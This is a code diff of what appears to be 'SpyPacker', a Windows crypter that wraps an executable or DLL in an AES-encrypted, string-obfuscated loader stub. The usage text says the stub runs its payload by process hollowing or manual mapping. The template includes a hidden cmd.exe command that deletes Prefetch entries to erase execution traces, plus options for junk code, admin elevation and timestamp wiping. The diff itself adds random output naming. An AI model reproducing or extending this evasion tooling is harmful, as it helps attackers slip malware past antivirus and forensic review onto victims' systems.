@@ -33,16 +33,12 @@ const char* CRYPTER_BASE_SOURCE =
 "#include <stdlib.h>\n"
 "#include <string.h>\n"
 "#include <windows.h>\n"
-"#include <fstream>\n"
-//"#include <algorithm>\n"
-//"#include <cctype>\n"
-//"#include <tchar.h>\n"
+"#include <fstream>\n" 
 "using namespace std;\n"
 "using std::stringstream;\n"
 "#include \"%s/%s\"\n"
 "#include \"%s/tools/aes/aes.h\"\n"
-"#include \"%s/tools/aes/aes.c\"\n"
-//"#include \"%s/tools/DataObfuscator.h\"\n"
+"#include \"%s/tools/aes/aes.c\"\n" 
 "#include \"%s/tools/main.h\"\n"
 "unsigned char p[] = {%s};\n"
 "auto k = MP_OB(\"%s\");\n"
@@ -87,8 +83,6 @@ const char* CRYPTER_BASE_SOURCE =
 "char clear_prefetch[0x1000];\n"
 "snprintf(clear_prefetch , 0x1000, XorStr(\"cmd.exe /c timeout 3 & del %%s%%s* & del %%scmd.exe* & del %%stimeout.exe* \") , prefetch, exe.c_str(), prefetch, prefetch);\n"
 "printfdbg(clear_prefetch);\n"
-
-//"CHAR cat[MAX_PATH] = \"\"; strcat(cat, XorStr(\"cmd.exe /c timeout 3 & del \\\"C:\\\\Windows\\\\Prefetch\\\\\")); \n"
 "STARTUPINFOA startInf;\n"
 "memset(&startInf, 0, sizeof startInf);\n"
 "startInf.cb = sizeof(startInf);\n"
@@ -97,10 +91,6 @@ const char* CRYPTER_BASE_SOURCE =
 
 "BOOL b = CreateProcessA(NULL, clear_prefetch, NULL, NULL, FALSE,\n"
 "	NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &startInf, &procInf); \n"
-
-//"BOOL b = CreateProcessA(NULL, strcat(strcat(cat, exe.c_str()), XorStr(\"*\\\" & del \\\"C:\\\\Windows\\\\Prefetch\\\\cmd.exe*\\\" & del \\\"C:\\\\Windows\\\\Prefetch\\\\timeout.exe*\\\" \")), NULL, NULL, FALSE,\n"
-//"	NORMAL_PRIORITY_CLASS | CREATE_NO_WINDOW, NULL, NULL, &startInf, &procInf); \n"
-
 "%s\n" //function_trash_0();
 "#ifdef DEBUG\n"
 "system(\"pause\");\n"
@@ -482,7 +472,7 @@ void main(int argc, char* argv[])
 	Exec("mode con: cols=120 & mode con:lines=30");
 	printf("SpyPacker started!'\n");
 	 
-	char* infile_path; char* target_name;
+	char* infile_path; char* target_name; int outnametype = 0; char* outname;
 	bool target = false, conpresent = false, trash = false, manifest = false, input = false, output = false;
 	 
 	for (int i = 1; i < argc; ++i) { 
@@ -535,12 +525,35 @@ void main(int argc, char* argv[])
 				return;
 			}
 		}
+		 
+		else if (!strcmp(argv[i], "-n") || !strcmp(argv[i], "-name")) {
+			if (i + 1 < argc) {
+				i++; 
+				char* optarg = argv[i];
+				if (strcmp(optarg, "random")) {
+					outname = argv[i];
+					outnametype = 1;
+					printf("Output name %s\n", target_name);
+				}
+				else
+				{
+					outnametype = 2;
+					printf("Random output name\n");
+				}
+			}
+			else {
+				std::cerr << "-name option requires one argument." << std::endl;
+				system("pause");
+				return;
+			}
+		}
+
 	}
  
 	if (argc < 5 || !input || !output)
 	{
 		//manual map (if source is dll) or process hollow (if source is exe)
-		printf("Usage: SpyPacker.exe -in \"file.exe|dll\" -out exe|dll [-target \"process.exe\"] [-console] [-genjunk] [-requireadmin]\r\n"); 
+		printf("Usage: SpyPacker.exe -in \"file.exe|dll\" -out exe|dll [-target \"process.exe\"] [-name \"output.exe\"] [-console] [-genjunk] [-requireadmin]\r\n"); 
 		system("pause");
 		return;
 	}
@@ -554,6 +567,33 @@ void main(int argc, char* argv[])
 
 	printf("initiated %s\n", infile_path);
 
+	if (outnametype == 0) {
+		char* out_exe = (char*)malloc((strlen(infile_path) + 5));
+		ZeroMemory(out_exe, (strlen(infile_path) + 5));
+		memcpy(out_exe, infile_path, (strlen(infile_path)));
+		if (type < 2)
+			strcat(out_exe, ".exe");
+		else strcat(out_exe, ".dll");
+		outname = out_exe;
+	}
+	//random name
+	if (outnametype == 2) {
+		srand(time(0));
+		char letters[] = "0123456789abcdefghijklmnopqrstuvwxyz";
+		char newname[17];
+		int z = rand() % 5 + 5;
+		for (int i = 0; i < z; i++)
+		{
+			char x = letters[rand() % 36];
+			newname[i] = x;
+		}
+		newname[z] = 0x0;
+		if (type < 2)
+			strcat(newname, ".exe");
+		else strcat(newname, ".dll");
+		outname = newname;
+	}
+	 
 	FILE* stream = fopen(ctx->infile, "rb");
 
 	if (stream == NULL)
@@ -771,13 +811,7 @@ void main(int argc, char* argv[])
 
 	_tprintf(_T("Building...\n"));
 
-	//CREATING & EXECUTING BATFILE
-	char* out_exe = (char*)malloc((strlen(infile_path) + 5));
-	ZeroMemory(out_exe, (strlen(infile_path) + 5));
-	memcpy(out_exe, infile_path, (strlen(infile_path)));
-	if (type < 2)
-		strcat(out_exe, ".exe");
-	else strcat(out_exe, ".dll");
+	//CREATING & EXECUTING BATFILE 
 	  
 	string VSpath = Exec((char*)"powershell.exe -ExecutionPolicy Bypass -Command \"Get-ChildItem HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall | foreach { Get-ItemProperty $_.PsPath } | where { $_.DisplayName -like '*Visual Studio*' -and $_.InstallLocation.Length -gt 0 } | sort InstallDate -Descending | foreach { (Join-Path $_.InstallLocation 'VC\\Auxiliary\\Build') } | where { Test-Path $_ } | select -First 1\"");
 	  
@@ -785,20 +819,20 @@ void main(int argc, char* argv[])
 
 	char MANIFEST[0x500];
 	ZeroMemory(MANIFEST, 0x500);
-	if (manifest) snprintf(MANIFEST, 0x500, "/MANIFEST /MANIFESTUAC:\"level = 'requireAdministrator' uiAccess = 'false'\" & mt.exe -manifest \"%s.manifest\" -outputresource:\"%s;%c\" -validate_manifest ", out_exe, out_exe, type < 2 ? '1' : '2');
+	if (manifest) snprintf(MANIFEST, 0x500, "/MANIFEST /MANIFESTUAC:\"level = 'requireAdministrator' uiAccess = 'false'\" & mt.exe -manifest \"%s.manifest\" -outputresource:\"%s;%c\" -validate_manifest ", outname, outname, type < 2 ? '1' : '2');
 	 
 	char BAT_SRC[0x1000];
 	ZeroMemory(BAT_SRC, 0x1000);
 	snprintf(BAT_SRC, 0x1000, "call \"%s\\vcvars%s.bat\"&"
 		"cl.exe \"%s\" kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib version.lib /nologo /GS- /MT /link /subsystem:windows /MACHINE:%s /SAFESEH:NO /OUT:\"%s\" /FIXED:NO /DYNAMICBASE /NXCOMPAT %s %s", 
-		VSpath.c_str(), platform_vcvars, source_out, platform, out_exe, type < 2 ? "/entry:mainCRTStartup" : "/DLL", manifest ? MANIFEST : "\"");
+		VSpath.c_str(), platform_vcvars, source_out, platform, outname, type < 2 ? "/entry:mainCRTStartup" : "/DLL", manifest ? MANIFEST : "\"");
 
 	fprintf(stdout, BAT_SRC);
 	cout << endl;
 
 	Exec(BAT_SRC);
 	 
-	CleanTimeDateStamps(out_exe);
+	CleanTimeDateStamps(outname);
 
 	printf("Done\n");
 
